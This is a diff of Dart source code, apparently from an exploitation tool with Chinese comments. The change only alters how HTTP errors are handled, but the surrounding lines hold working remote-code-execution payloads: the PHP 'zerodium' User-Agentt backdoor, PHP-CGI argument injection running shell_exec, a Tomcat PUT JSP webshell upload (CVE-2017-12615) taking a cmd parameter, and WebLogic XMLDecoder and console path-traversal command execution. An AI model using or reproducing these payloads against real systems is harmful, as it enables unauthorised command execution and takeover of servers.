@@ -29,7 +29,7 @@ class PhpBackdoorExpService {
 
   Future<ExpResult> check() async {
     try {
-      final res = await _httpClient.get(
+      final res = await _httpClient.getOrThrow(
         '$_base$phpPath',
         headers: {'User-Agentt': 'zerodiumsystem("echo PHP_BACKDOOR_54289");'},
       );
@@ -58,7 +58,7 @@ class PhpBackdoorExpService {
       // PHP 双引号串会插值 $var：必须用单引号字面量，否则 `echo $HOME`
       // 会被 PHP 当成变量、命令变成 `echo `（实测丢参数）。
       final escaped = RceEncoder.phpSingleQuoted(cmd);
-      final res = await _httpClient.get(
+      final res = await _httpClient.getOrThrow(
         '$_base$phpPath',
         headers: {
           'User-Agentt':
@@ -98,7 +98,7 @@ class PhpCgiExpService {
     try {
       final url =
           '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
-      final res = await _httpClient.post(
+      final res = await _httpClient.postOrThrow(
         url,
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: '<?php echo "PHP_CGI_54289"; ?>',
@@ -123,7 +123,7 @@ class PhpCgiExpService {
       final escaped = RceEncoder.phpSingleQuoted(cmd);
       const begin = 'MATRIX_CGI_BEGIN';
       const end = 'MATRIX_CGI_END';
-      final res = await _httpClient.post(
+      final res = await _httpClient.postOrThrow(
         url,
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: "<?php echo '$begin'; echo shell_exec('$escaped'); echo '$end'; ?>",
@@ -172,9 +172,16 @@ class TomcatExpService {
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: probeJsp,
       );
+      // PUT 没有 orThrow 包装：网络层失败时必须显式区分，否则会落到"未发现"。
+      if (!putJspRes.isOk) {
+        return ExpResult.probeFailed(
+          'CVE-2017-12615',
+          '探测失败: ${putJspRes.error ?? 'no response'}',
+        );
+      }
       if (putJspRes.statusCode == 201 || putJspRes.statusCode == 204) {
         final jspGetRes =
-            await _httpClient.get('$_base/tomcat_check_54289.jsp');
+            await _httpClient.getOrThrow('$_base/tomcat_check_54289.jsp');
         if ((jspGetRes.body ?? '').contains('TOMCAT_JSP_54289')) {
           return ExpResult(
             true,
@@ -191,7 +198,7 @@ class TomcatExpService {
       );
       if (putRes.statusCode == 201 || putRes.statusCode == 204) {
         final getRes =
-            await _httpClient.get('$_base/tomcat_put_test.txt');
+            await _httpClient.getOrThrow('$_base/tomcat_put_test.txt');
         if ((getRes.body ?? '').contains('tomcat_put_54289')) {
           return ExpResult(true, 'CVE-2017-12615', 'PUT 方法开启，文件写入并读取验证成功');
         }
@@ -229,7 +236,7 @@ class TomcatExpService {
         body: _shellContent,
       );
       await Future<void>.delayed(const Duration(milliseconds: 300));
-      final res = await _httpClient.get(
+      final res = await _httpClient.getOrThrow(
         '$_base/$_shellName.jsp?cmd=${Uri.encodeComponent(cmd)}',
       );
       final respBody = res.body ?? '';
@@ -353,7 +360,7 @@ class WebLogicExpService {
     var anyResponse = false;
     for (final path in _xmlDecoderProbePaths) {
       try {
-        final res = await _httpClient.post(
+        final res = await _httpClient.postOrThrow(
           '$_base$path',
           headers: const {
             'Content-Type': 'text/xml; charset=UTF-8',
@@ -383,7 +390,7 @@ class WebLogicExpService {
 
   Future<String?> execRceCve201710271(String cmd) async {
     try {
-      final res = await _httpClient.post(
+      final res = await _httpClient.postOrThrow(
         '$_base/wls-wsat/CoordinatorPortType',
         headers: {'Content-Type': 'text/xml'},
         body: _xmlDecoderPayload(cmd),
@@ -451,7 +458,7 @@ class WebLogicExpService {
       );
       final url =
           '$_base/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=$handle';
-      final res = await _httpClient.get(url);
+      final res = await _httpClient.getOrThrow(url);
       if (res.statusCode == 200 || res.statusCode == 302) {
         return '命令已发送 (状态 ${res.statusCode})，ShellSession 无直接回显';
       }
